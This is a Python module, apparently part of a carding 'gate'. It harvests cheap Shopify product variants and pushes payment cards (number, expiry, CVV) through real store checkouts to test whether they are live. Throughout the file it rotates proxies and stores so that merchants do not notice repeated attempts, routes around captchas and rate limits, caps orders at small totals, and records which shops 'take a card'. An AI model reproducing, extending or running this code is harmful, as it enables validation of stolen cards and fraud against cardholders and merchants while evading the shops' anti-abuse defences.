                _DB_CONN = sqlite3.connect("file:%s?mode=ro" % _DB_PATH,
                                           uri=True, check_same_thread=False,
                                           timeout=10)
                _DB_CONN.row_factory = sqlite3.Row
    return _DB_CONN


def _normalize_site_key(url: str) -> str:
    """The name of the shop, without the noise around it."""
    s = (url or "").strip().strip('"').strip("'").lower()
    s = s.rstrip("/\\")
    for prefix in ("https://", "http://"):
        if s.startswith(prefix):
            s = s[len(prefix):]
            break
    s = s.rstrip("/\\")
    if "/" in s:
        s = s.split("/", 1)[0]
    if "\\" in s:
        s = s.split("\\", 1)[0]
    return s


def lookup_variant_cache(site_url: str):
    """A thing of the shop, out of the database, or nothing."""
    db = _get_db()
    if db is None:
        return None
    key = _normalize_site_key(site_url)
    try:
        cur = db.execute(
            "SELECT variant_id, price FROM variants WHERE site=? "
            "AND price >= ? AND price <= ? ORDER BY RANDOM() LIMIT 1",
            (key, MIN_VARIANT_PRICE, MAX_VARIANT_PRICE))
        row = cur.fetchone()
        if row:
            return {"variant_id": row["variant_id"],
                    "price": "%.2f" % row["price"]}
    except Exception as e:
        logger.debug("the database could not be asked: %s", e)
    return None


def lookup_variant_exclude(site_url: str, exclude_id: str):
    """A thing of the shop, but not the one that was used."""
    db = _get_db()
    if db is None:
        return None
    key = _normalize_site_key(site_url)
    try:
        cur = db.execute(
            "SELECT variant_id, price FROM variants WHERE site=? "
            "AND variant_id!=? AND price >= ? AND price <= ? "
            "ORDER BY RANDOM() LIMIT 1",
            (key, str(exclude_id), MIN_VARIANT_PRICE, MAX_VARIANT_PRICE))
        row = cur.fetchone()
        if row:
            return {"variant_id": row["variant_id"],
                    "price": "%.2f" % row["price"]}
    except Exception as e:
        logger.debug("the database could not be asked: %s", e)
    return None


def get_all_variants_for_site(site_url: str) -> list:
    """Every thing of the shop inside the price window."""
    db = _get_db()
    if db is None:
        return []
    key = _normalize_site_key(site_url)
    try:
        cur = db.execute(
            "SELECT variant_id, price FROM variants WHERE site=? "
            "AND price >= ? AND price <= ? ORDER BY price ASC",
            (key, MIN_VARIANT_PRICE, MAX_VARIANT_PRICE))
        rows = cur.fetchall()
        if not rows:
            return []
        out = [{"variant_id": r["variant_id"], "price": "%.2f" % r["price"]}
               for r in rows]
        random.shuffle(out)
        return out
    except Exception as e:
        logger.debug("the database could not be asked: %s", e)
    return []


_US_COUNTRY_HINTS = {"united states", "us", "usa", "u.s.", "u.s.a."}


def _pick_best_variant(products):
    """The thing that is bought: in stock, and inside the price window."""
    best_us = (float("inf"), None)
    best_avail = (float("inf"), None)
    best_any = (float("inf"), None)
    for p in products or []:
        handle = p.get("handle", "")
        for v in p.get("variants", []):
            try:
                price = float(str(v.get("price", "0")).replace(",", ""))
            except (ValueError, TypeError):
                continue
            if price <= 0:
                continue
            if price < MIN_VARIANT_PRICE or price > MAX_VARIANT_PRICE:
                continue
            candidate = {
                "site": p.get("site", ""),
                "price": "%.2f" % price,
                "variant_id": str(v["id"]),
                "product_handle": handle,
                "link": "",
            }
            available = v.get("available", True)
            is_us = False
            for key in ("option1", "option2", "option3"):
                val = (v.get(key) or "").lower().strip()
                if val in _US_COUNTRY_HINTS:
                    is_us = True
                    break
            if available and is_us and price < best_us[0]:
                best_us = (price, candidate)
            if available and price < best_avail[0]:
                best_avail = (price, candidate)
            if price < best_any[0]:
                best_any = (price, candidate)
    return best_us[1] or best_avail[1] or best_any[1]


async def fetch_products(domain, proxy_str=None):
    """The goods list of the shop, and the thing that is bought from it."""
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain
        parsed = urlparse(domain)
        host = parsed.netloc or parsed.path
        if not host or "." not in host or " " in host:
            return False, "Site Error! Status: 0"

        proxy = parse_proxy(proxy_str) if proxy_str else None
        hdrs = {
            "User-Agent": UA,
            "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                       "image/avif,image/webp,image/apng,*/*;q=0.8,"
                       "application/signed-exchange;v=b3;q=0.7"),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "priority": "u=0, i",
            "sec-ch-ua": SEC_CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
        }
        HARD_DEAD = (401, 402, 403, 404, 410, 423, 451)
        SOFT_DEAD = (429, 500, 502, 503, 530)

        cffi_sess = make_cffi_session(proxy_str)

        async def _cffi_get(url, headers=None, allow_redirects=True):
            resp = await cffi_sess.get(url, headers=headers,
                                       allow_redirects=allow_redirects,
                                       timeout=20)
            return resp.status_code, resp.text

        async def _aio_get_fallback(url, hdrs_):
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(
                    connector=make_connector(), timeout=timeout) as s:
                async with s.get(url, headers=hdrs_, proxy=proxy,
                                 allow_redirects=True) as r:
                    return r.status, await r.text()

        async def smart_get(url, extra_hdrs=None):
            h = {**hdrs, **(extra_hdrs or {})}
            if cffi_sess is not None:
                try:
                    return await _cffi_get(url, headers=h)
                except Exception as e:
                    logger.info("the browser handshake failed on %s: %s", url, e)
            return await _aio_get_fallback(url, h)

        try:
            primary_failed = False
            try:
                status, text = await smart_get("%s/products.json?limit=5" % domain)
                if status in HARD_DEAD:
                    return False, "Site Error! Status: %d" % status
                if status in SOFT_DEAD:
                    primary_failed = True
                elif status == 200:
                    try:
                        data = json.loads(text)
                    except json.JSONDecodeError:
                        data = {}
                    products = data.get("products", [])
                    if products:
                        result = _pick_best_variant(products)
                        if result:
                            result["site"] = domain
                            return result, ""
                        primary_failed = True
                    elif '"handle"' not in text and '"variants"' not in text:
                        return False, "Not Shopify"
                    else:
                        primary_failed = True
                else:
                    primary_failed = True
            except Exception as e:
                err_s = str(e).lower()
                if "proxy" in err_s or "cannot connect" in err_s:
                    return False, "Cannot connect to proxy: %s" % e
                if "connect" in err_s or "timeout" in err_s:
                    return False, "Site Error! Status: 0"
                logger.info("the goods list did not come: %s", e)
                primary_failed = True

            try:
                status, text = await smart_get("%s/products.json?limit=25" % domain)
                if status == 200:
                    result = _pick_best_variant(json.loads(text).get("products", []))
                    if result:
                        result["site"] = domain
                        return result, ""
            except Exception:
                pass

            try:
                status, text = await smart_get(
                    "%s/collections/all/products.json?limit=5" % domain)
                if status == 200:
                    result = _pick_best_variant(json.loads(text).get("products", []))
                    if result:
                        result["site"] = domain
                        return result, ""
            except Exception:
                pass

            try:
                html_extra = {"Accept": ("text/html,application/xhtml+xml,"
                                         "application/xml;q=0.9,*/*;q=0.8")}
                status, html = await smart_get("%s/collections/all" % domain,
                                               extra_hdrs=html_extra)
                if status == 200:
                    vm = re.findall(r'"id"\s*:\s*(\d{11,14})', html)
                    pm = re.findall(r'"price"\s*:\s*"?(\d{2,8})"?', html)
                    if vm and pm:
                        raw = float(pm[0])
                        price = raw / 100.0 if raw > 999 else raw
                        if MIN_VARIANT_PRICE <= price <= MAX_VARIANT_PRICE:
                            return ({"site": domain, "price": "%.2f" % price,
                                     "variant_id": vm[0], "product_handle": "",
                                     "link": domain}, "")
            except Exception:
                pass
        finally:
            if cffi_sess is not None:
                try:
                    await cffi_sess.close()
                except Exception:
                    pass

        return False, "No Products"
    except Exception as e:
        return False, "error: %s" % e


# ---------------------------------------------------------------------------
# The cooling of the shops and of the places.  A shop that says no too
# often is left alone for a while, and the same for a place.
# ---------------------------------------------------------------------------
_site_429_lock = threading.Lock()
_site_429_until: dict = {}
_proxy_429_until: dict = {}
_site_429_hits: dict = {}
_site_429_hits_ts: dict = {}
SITE_429_COOLDOWN = 3
PROXY_429_COOLDOWN = 5
SITE_429_HIT_WINDOW = 60
SITE_429_HIT_MAX = 5


def _proxy_key(proxy_str: str) -> str:
    """The name of a place, without the name of the one who pays for it."""
    if not proxy_str:
        return "DIRECT"
    try:
        p = urlparse(proxy_str)
        return "%s:%s" % (p.hostname, p.port)
    except Exception:
        return proxy_str[:50]


def _is_site_cooling(site_key: str) -> bool:
    with _site_429_lock:
        return time.time() < _site_429_until.get(site_key, 0)


def _is_proxy_cooling(proxy_str: str) -> bool:
    pk = _proxy_key(proxy_str)
    with _site_429_lock:
        return time.time() < _proxy_429_until.get(pk, 0)


def _set_site_cooldown(site_key: str, proxy_str: str = None):
    """The shop is left alone for a while."""
    now = time.time()
    with _site_429_lock:
        win_start = _site_429_hits_ts.get(site_key, 0)
        if now - win_start > SITE_429_HIT_WINDOW:
            _site_429_hits[site_key] = 1
            _site_429_hits_ts[site_key] = now
        else:
            _site_429_hits[site_key] = _site_429_hits.get(site_key, 0) + 1
        hits = _site_429_hits.get(site_key, 1)
        wait = SITE_429_COOLDOWN if hits < SITE_429_HIT_MAX else SITE_429_COOLDOWN * 3
        _site_429_until[site_key] = now + wait
        if hits >= SITE_429_HIT_MAX and proxy_str:
            _proxy_429_until[_proxy_key(proxy_str)] = now + PROXY_429_COOLDOWN


def _clear_site_cooldown(site_key: str):
    """The shop answered, so it is asked again straight away."""
    with _site_429_lock:
        _site_429_until.pop(site_key, None)
        _site_429_hits.pop(site_key, None)
        _site_429_hits_ts.pop(site_key, None)


# ---------------------------------------------------------------------------
# The gap between two asks of the same shop from the same place.
# ---------------------------------------------------------------------------
_sp_gap_lock = threading.Lock()
_sp_last_hit: dict = {}
SITE_PROXY_GAP_S = 8


def _can_attempt(site_key: str, proxy_str: str) -> tuple:
    """May this shop be asked from this place now, and if not, when."""
    pk = _proxy_key(proxy_str or "")
    key = (site_key, pk)
    now = time.time()
    with _sp_gap_lock:
        last = _sp_last_hit.get(key, 0)
        gap = now - last
        if gap < SITE_PROXY_GAP_S:
            return False, SITE_PROXY_GAP_S - gap
        return True, 0.0


def _record_attempt(site_key: str, proxy_str: str):
    """This shop was asked from this place just now."""
    pk = _proxy_key(proxy_str or "")
    key = (site_key, pk)
    with _sp_gap_lock:
        _sp_last_hit[key] = time.time()


# ---------------------------------------------------------------------------
# The pool of shops.  The shops that answer go first, the shops that
# ask for a captcha go last, and the dear shops go last of all.
# ---------------------------------------------------------------------------
_GOOD_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "good_stores.json")
_CAPTCHA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "captcha_stores.json")
_DEAR_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "dear_stores.json")
_BAD_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "bad_stores.json")
_WORKING_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "working_stores.json")
# How long a shop that could not do a card is left alone.
BAD_STORE_SECONDS = float(os.environ.get("BAD_STORE_SECONDS", "240") or 240)
def _the_file_next_to_us(name: str) -> str:
    """The file that is next to this one, or in the folders around it."""
    here = os.path.dirname(os.path.abspath(__file__))
    for folder in (here,
                   os.path.join(here, ".."),
                   os.path.join(here, "..", "..", "shopify-api"),
                   os.path.join(here, "..", "..", "..", "shopify-api")):
        path = os.path.join(folder, name)
        if os.path.exists(path):
            return path
    return os.path.join(here, name)


# The lists of the gate: the shops that are asked, the places the cards
# leave from, and the things the finder found.
_SITES_FILE = _the_file_next_to_us("site.txt")
# The list of the validator service: the shops it asks, and they work.
_API_SITES_FILE = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "..", "shopify-api", "site.txt")
_PLACES_FILE = _the_file_next_to_us("places.txt")
_DB_PATH = _the_file_next_to_us("variants.db")

_CAPTCHA_STORES: dict = {}
CAPTCHA_STORE_SECONDS = float(os.environ.get("CAPTCHA_STORE_SECONDS", "21600") or 21600)
_PLACES: list = []
_PLACE_TURN = [0]
_SHOP_TURN: dict = {}


def _the_store_key(site: str) -> str:
    return _normalize_site_key(site)


def _the_good_stores() -> dict:
    try:
        with open(_GOOD_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _write_the_good_stores(data) -> None:
    try:
        with open(_GOOD_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=1)
    except Exception as e:
        logger.debug("the shops that answer could not be written down: %s", e)


def _remember_the_good_store(site: str) -> None:
    data = _the_good_stores()
    key = _the_store_key(site)
    data[key] = int(data.get(key) or 0) + 1
    _write_the_good_stores(data)


def _the_known_captcha_stores() -> dict:
    try:
        with open(_CAPTCHA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _the_kind_of_the_captcha(site: str) -> str:
    """The kind of the captcha the shop asks for, if it asks for one.

    The free one is the one our own solver can answer, so a shop with
    another kind is a shop a card does not go to.
    """
    try:
        data = _the_known_captcha_stores()
    except Exception:
        return ""
    one = data.get(_the_store_key(site))
    if isinstance(one, dict):
        try:
            if float(one.get("until") or 0) > time.time():
                return str(one.get("kind") or "")
        except (TypeError, ValueError):
            return ""
        return ""
    return ""


def _write_the_known_captcha_stores(data) -> None:
    try:
        with open(_CAPTCHA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=1)
    except Exception as e:
        logger.debug("the shops that ask for a captcha could not be written: %s", e)


def _remember_the_captcha(site: str, kind: str = "") -> None:
    data = _the_known_captcha_stores()
    data[_the_store_key(site)] = {"until": time.time() + CAPTCHA_STORE_SECONDS,
                                  "kind": kind or ""}
    _write_the_known_captcha_stores(data)


def _the_store_asks_for_a_captcha(site: str) -> bool:
    until = _CAPTCHA_STORES.get(_the_store_key(site))
    if until is None:
        data = _the_known_captcha_stores()
        until = data.get(_the_store_key(site))
        if until is None:
            return False
    try:
        return float(until) > time.time()
    except (TypeError, ValueError):
        return False


def _the_captcha_stores_are_known() -> None:
    """The shops that asked for a captcha are known from the start."""
    now = time.time()
    for key, until in list(_the_known_captcha_stores().items()):
        try:
            if float(until) > now:
                _CAPTCHA_STORES[key] = until
        except (TypeError, ValueError):
            continue


def _the_no_ship_stores() -> dict:
    """The shops that do not send to our address."""
    try:
        with open(_NO_SHIP_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _remember_the_no_ship_store(site: str) -> None:
    """The shop does not send to our address, and is out for good."""
    try:
        data = _the_no_ship_stores()
        data[_the_store_key(site)] = time.time()
        with open(_NO_SHIP_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=1)
    except Exception as e:
        logger.debug("the shops that do not send were not written: %s", e)


def _the_store_does_not_ship(site: str) -> bool:
    """Does this shop send to our address?"""
    try:
        return _the_store_key(site) in _the_no_ship_stores()
    except Exception:
        return False


def _the_working_stores() -> dict:
    """The shops that are known to take a card, and how often."""
    try:
        with open(_WORKING_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _the_bad_stores() -> dict:
    """The shops that could not do a card, and until when."""
    try:
        with open(_BAD_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _write_the_bad_stores(data) -> None:
    try:
        with open(_BAD_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=1)
    except Exception as e:
        logger.debug("the shops that could not do a card were not written: %s", e)


def _remember_the_bad_store(site: str) -> None:
    """The shop could not do a card, so it is left alone for a while."""
    data = _the_bad_stores()
    data[_the_store_key(site)] = time.time() + BAD_STORE_SECONDS
    _write_the_bad_stores(data)


def _the_store_is_bad(site: str) -> bool:
    """Is the shop one that could not do a card?"""
    try:
        until = _the_bad_stores().get(_the_store_key(site))
        return bool(until) and float(until) > time.time()
    except (TypeError, ValueError):
        return False


def _the_dear_stores() -> dict:
    try:
        with open(_DEAR_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _remember_the_dear_store(site: str) -> None:
    """The shop takes more than the card is put up for, so it is left."""
    try:
        data = _the_dear_stores()
        data[_the_store_key(site)] = time.time() + 3600
        with open(_DEAR_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=1)
    except Exception as e:
        logger.debug("the dear shops could not be written down: %s", e)


def _the_places() -> list:
    """The places the cards leave from."""
    global _PLACES
    if _PLACES:
        return _PLACES
    out = []
    try:
        with open(_PLACES_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except Exception:
        out = []
    if not out:
        try:
            for name in ("../../proxy.txt",
                         "../../hitchk-app/shopify-api/proxies.txt"):
                path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    name)
                if not os.path.exists(path):
                    continue
                with open(path, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            out.append(line)
                break
        except Exception:
            out = []
    # The places the person has set with /setproxy are places too.
    for place in _the_places_of_the_person():
        if place not in out:
            out.append(place)
    _PLACES = out
    return out


def _the_places_of_the_person() -> list:
    """The places the person has set with /setproxy."""
    out = []
    for name in ("user_proxies.json",):
        for folder in (os.path.dirname(os.path.abspath(__file__)),
                       os.path.join(os.path.dirname(
                           os.path.abspath(__file__)), ".."),
                       os.path.join(os.path.dirname(
                           os.path.abspath(__file__)), "..", "..")):
            path = os.path.join(folder, name)
            if not os.path.exists(path):
                continue
            try:
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if isinstance(data, dict):
                    data = list(data.values())
                for one in (data or []):
                    if isinstance(one, str):
                        one = one.strip()
                        if one:
                            out.append(one)
                    elif isinstance(one, dict):
                        for key in ("proxy", "proxy_str", "url", "address"):
                            if one.get(key):
                                out.append(str(one[key]).strip())
                                break
            except Exception:
                pass
            if out:
                break
    return out


def _the_next_place() -> Optional[str]:
    """The next place a card leaves from.

    Only the places that answered the last time they were asked are
    used, for a place that does not answer costs fifteen seconds of
    waiting for nothing.
    """
    places = _the_live_places()
    if not places:
        places = _the_places()
    if not places:
        return None
    _PLACE_TURN[0] = (_PLACE_TURN[0] + 1) % len(places)
    return places[_PLACE_TURN[0]]


# The places that answered, and when they were asked.
_LIVE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "live_places.json")
LIVE_PLACE_SECONDS = float(os.environ.get("LIVE_PLACE_SECONDS", "900") or 900)


def _the_live_places() -> list:
    """The places that answered when they were last asked."""
    try:
        with open(_LIVE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        return []
    now = time.time()
    out = []
    for place, until in (data or {}).items():
        try:
            if float(until) > now:
                out.append(place)
        except (TypeError, ValueError):
            continue
    return out


def _remember_the_live_places(places) -> None:
    """The places that answered are written down."""
    try:
        data = _the_live_places_all()
        until = time.time() + LIVE_PLACE_SECONDS
        for place in places:
            data[place] = until
        with open(_LIVE_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=1)
    except Exception as e:
        logger.debug("the places that answered were not written down: %s", e)


def _the_live_places_all() -> dict:
    try:
        with open(_LIVE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


async def check_the_places(places=None) -> dict:
    """The places are asked if they are there.

    A place that answers in a moment is a place a card can leave from,
    and a place that does not answer is a place that is left alone.
    """
    places = list(places or _the_places())
    if not places:
        return {"asked": 0, "live": 0}
    sem = asyncio.Semaphore(12)
    live = []

    async def _one(place):
        async with sem:
            session = make_cffi_session(parse_proxy(place),
                                        pick_browser_profile())
            if session is None:
                return place, False
            try:
                resp = await session.get("https://api.ipify.org?format=json",
                                         timeout=12)
                return place, (resp.status_code == 200)
            except Exception:
                return place, False
            finally:
                try:
                    await session.close()
                except Exception:
                    pass

    results = await asyncio.gather(*[_one(p) for p in places],
                                     return_exceptions=True)
    for one in results:
        if isinstance(one, Exception):
            continue
        if one[1]:
            live.append(one[0])
    _remember_the_live_places(live)
    return {"asked": len(places), "live": len(live)}


def _the_stores_the_fetcher_knows() -> dict:
    """The shops the finder found, and the thing of each of them."""
    out = {}
    try:
        import sqlite3 as _sq
        path = _DB_PATH
        if not os.path.exists(path):
            return out
        conn = _sq.connect("file:%s?mode=ro" % path, uri=True, timeout=10)
        conn.row_factory = _sq.Row
        cur = conn.execute("SELECT site, variant_id, price FROM variants")
        for row in cur.fetchall():
            key = row["site"]
            try:
                price = float(row["price"])
            except (TypeError, ValueError):
                continue
            if price < MIN_VARIANT_PRICE or price > MAX_VARIANT_PRICE:
                continue
            if key in out:
                continue
            out[key] = {"variant_id": row["variant_id"],
                        "price": "%.2f" % price}
        conn.close()
    except Exception as e:
        logger.debug("the shops of the finder could not be read: %s", e)
    return out


def _a_thing_of_the_store(site: str) -> Optional[dict]:
    """The thing of the shop, out of the finder's list."""
    known = _the_stores_the_fetcher_knows()
    key = _the_store_key(site)
    for k, v in known.items():
        if _the_store_key(k) == key:
            return v
    return None


# How many cards one shop may have at the same time.
_SHOP_SLOTS: dict = {}
_SHOP_SLOT_LOCK = threading.Lock()
SHOP_SLOTS = int(os.environ.get("SHOP_SLOTS", "2") or 2)
# A card with no money on it takes longer: the shop asks for a check
# and the check has to be answered, so it is given more of the time of
# the card and more of the shops.
SHOP_SLOTS_SLOW = int(os.environ.get("SHOP_SLOTS_SLOW", "1") or 1)


def _the_slot_of_the_shop(key: str) -> asyncio.Semaphore:
    """The gate of the shop: only so many cards at the same time."""
    with _SHOP_SLOT_LOCK:
        sem = _SHOP_SLOTS.get(key)
        if sem is None:
            sem = asyncio.Semaphore(SHOP_SLOTS)
            _SHOP_SLOTS[key] = sem
        return sem


# The answers that say nothing about the card: the store could not do
# it, so the next store gets a turn.
_NOT_ABOUT_THE_CARD = (
    "THROTTLED", "CAPTCHA_REQUIRED", "NO_PRODUCT", "CART_FAILED",
    "SITE_REQUIRES_LOGIN", "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
    "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED", "TIMEOUT",
    "SITE_ERROR", "PROXY_ERROR", "NO_SELLER_PROPOSAL", "GRAPHQL_ERROR",
    "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX",
    "TOKENIZATION_FAILED", "SUBMIT_FAILED", "NEGOTIATE_FAILED",
    # the processor gave up, which is a fault of the shop and not a word
    # about the card, so the next shop is asked
    "PROCESSING_ERROR", "PROCESSOR_ERROR", "GATEWAY_ERROR",
    # the shop is complaining about the order, not about the card
    "SHOP_ORDER_ERROR",
)

# What the order may come to.  The things are cheap, but the postage
# is not, and the shop says the price of the order and the price of the
# order is what the card would be put up for.
MAX_TOTAL = float(os.environ.get("SHOP_MAX_TOTAL", "15.00") or 15.00)

# How long one card may walk from shop to shop, and how many shops it
# may be put into.
CARD_BUDGET = float(os.environ.get("SHOP_CARD_BUDGET", "60") or 60)
CARD_SHOPS = int(os.environ.get("SHOP_CARD_SHOPS", "8") or 8)
# The share of the time of the card that one shop may take.
SHOP_SHARE = float(os.environ.get("SHOP_SHARE", "12") or 12)


def _the_pool_of_shops() -> list:
    """The shops that are asked, and in what order.

    The shops that are known to take a card come first, for they are
    the ones that answer, and the card is put in them at once.  The
    rest of the pool is behind them, for a shop that cannot take a card
    costs the card the time it waits.
    """
    sites = []
    # The shops of the validator service come first, for they are the
    # ones that answer, and the api asks ten cards in nine seconds with
    # them.  The rest of the pool is behind them.
    for path in (_API_SITES_FILE, _SITES_FILE):
        try:
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and line not in sites:
                        sites.append(line)
        except Exception:
            pass

    # The shops that are known to work, and how often they answered.
    wins = {}
    for source in (_the_good_stores(), _the_working_stores()):
        for key, hits in source.items():
            wins[key] = wins.get(key, 0) + int(hits or 0)

    front = []
    rest = []
    for site in sites:
        key = _the_store_key(site)
        if key in wins:
            front.append(site)
        else:
            rest.append(site)
    # The shops that answered are in the order of how much they answered.
    front = [s for s in front if not _the_store_does_not_ship(s)]
    front.sort(key=lambda s: -wins.get(_the_store_key(s), 0))
    # A shop that answered and is not in the list is put in as well.
    for key in sorted(wins, key=lambda k: -wins.get(k, 0)):
        for site in front + rest:
            if _the_store_key(site) == key:
                break
        else:
            front.append("https://" + key)
    # And the shops that are always good are at the back.
    for site in DEFAULT_SITE_ROTATION:
        if site not in front and site not in rest:
            rest.append(site)
    return front + rest



def _the_order_of_shops(lane: int = 0) -> list:
    """The shops, in the order this group of cards will ask them.

    The shops that cannot take the card are not asked at all, unless
    there is nothing else.  A shop that asks for a captcha, and a shop
    whose order comes to more than the cap, each cost a card many
    seconds, so they are asked last of all.
    """
    sites = _the_pool_of_shops()
    late = []
    ready = []
    dear = _the_dear_stores()
    now = time.time()
    for s in sites:
        key = _the_store_key(s)
        if _the_store_does_not_ship(s):
            # the shop does not send to our address, and no card will
            # ever be put in it
            continue
        _kind = _the_kind_of_the_captcha(s)
        if _kind and _kind != "hcaptcha":
            # The shop asks for a captcha of a kind our own solver
            # cannot answer, so a card does not go to it at all.
            continue
        if _the_store_asks_for_a_captcha(s):
            # The free captcha is answered by our own solver, so the
            # shop is still a shop we can use.  It is remembered, so it
            # is not asked first, but it is not thrown out.
            late.append(s)
            continue
        if _the_store_is_bad(s):
            late.append(s)
            continue
        try:
            if float(dear.get(key, 0) or 0) > now:
                late.append(s)
                continue
        except (TypeError, ValueError):
            pass
        ready.append(s)
    sites = ready + late
    if len(sites) > 1:
        # Each group of cards has a turn of its own, so the groups do
        # not all go to the same shop at the same time.
        turn = _SHOP_TURN.get(lane, 0)
        _SHOP_TURN[lane] = (turn + 1) % len(sites)
        sites = sites[turn:] + sites[:turn]
    return sites


async def check_card_native(cc: str, mm: str, yy: str, cvv: str,
                            site_url: Optional[str] = None,
                            proxy_str: Optional[str] = None,
                            max_price: Optional[float] = None,
                            lane: int = 0) -> dict:
    """The card is put into the checkout of a shop.

    The lane is the group of cards this card belongs to, so each group
    has a turn of its own over the shops.
    """
    if max_price is None:
        max_price = MAX_TOTAL
    cap = max_price
    if site_url:
        sites = [site_url]
    else:
        _the_captcha_stores_are_known()
        sites = _the_order_of_shops(lane)

    last = None
    asked = 0
    # The clock of the card: the card may walk from shop to shop, but
    # not for ever.
    deadline = time.time() + CARD_BUDGET
    for site in sites:
        if asked >= CARD_SHOPS:
            break
        if asked and time.time() > deadline:
            logger.info("the card ran out of time after %d shops", asked)
            break
        asked += 1
        if time.time() > deadline:
            logger.info("the card ran out of time before it was asked")
            break
        try:
            slot = _the_slot_of_the_shop(_the_store_key(site))
            # The card leaves from a place of its own, so the shops do
            # not see one computer asking and asking.
            where = proxy_str or _the_next_place()
            # The waiting for the shop is not counted against the time
            # of the card: a card that waits its turn at the shop has
            # not used any of its time yet.  It is the time of the shop
            # that is counted.
            async with slot:
                # The flow asks the gate for its helpers, so it is taken
                # here and not at the top: the two do not hold each other
                # up.
                from . import shopify_native_flow as flow
                # One shop may not take the whole of the time of the
                # card: a shop that is slow is given its share of the
                # time and no more, and the next shop is asked.
                left = deadline - time.time()
                share = max(20.0, min(float(SHOP_SHARE), left))
                try:
                    out = await asyncio.wait_for(
                        flow.check_card_native(
                            cc, mm, yy, cvv, site_url=site,
                            proxy_str=where, max_price=cap),
                        timeout=share)
                except asyncio.TimeoutError:
                    out = {"Response": "TIMEOUT",
                           "Message": "the shop was too slow"}
        except Exception as e:
            logger.warning("the store %s could not be asked: %s", site,
                           str(e)[:90])
            out = {"Response": "SITE_ERROR", "Message": str(e)[:100]}
        last = out
        code = str(out.get("Response") or "").split(":", 1)[0].strip().upper()
        if code == "CAPTCHA_REQUIRED":
            _remember_the_captcha(site, str(out.get("Captcha") or ""))
        if code.startswith("PRICE_OVER_MAX"):
            _remember_the_dear_store(site)
        if code in _NOT_ABOUT_THE_CARD:
            logger.info("the store %s said %s, so the next one is asked",
                        site, code)
            # The shop is remembered as one that could not do a card, so
            # the next card goes straight to a shop that can.
            if code in ("SHOP_ORDER_ERROR", "CART_FAILED", "TOKENIZATION_FAILED",
                        "TIMEOUT", "SITE_ERROR", "GRAPHQL_ERROR", "NO_PRODUCT",
                        "PRICE_OVER_MAX", "PROXY_ERROR", "NEGOTIATE_FAILED"):
                _remember_the_bad_store(site)
            continue
        _remember_the_good_store(site)
        return out
    if last is not None:
        # The shop gave no word about the card: it could not finish the
        # payment, or it was still working on it when the time ran out.
        # That is not a word about the card, so it is said as what it is.
        code = str(last.get("Response") or "").split(":", 1)[0].strip().upper()
        if code in _NOT_ABOUT_THE_CARD:
            out = dict(last)
            out["Response"] = code
            out["Message"] = ("no shop could finish the payment for this "
                               "card: %s"
                               % str(last.get("Message") or code)[:90])
            return out
        return last
    return {"Response": "NO_PRODUCT", "Message": "No shop was free to answer",
            "code": "NO_PRODUCT", "decline_code": "NO_PRODUCT",
            "Gateway": "Shopify Payments", "Price": "0.00", "Proxy": "Live",
            "Status": False, "Gate": "Shopify Payments",
            "CC": "%s|%s|%s|%s" % (cc, mm, yy, cvv), "Product": "", "Site": "",
            "Charged": "False", "Approved": "False", "Time": "0.0s",
            "Retry": True}
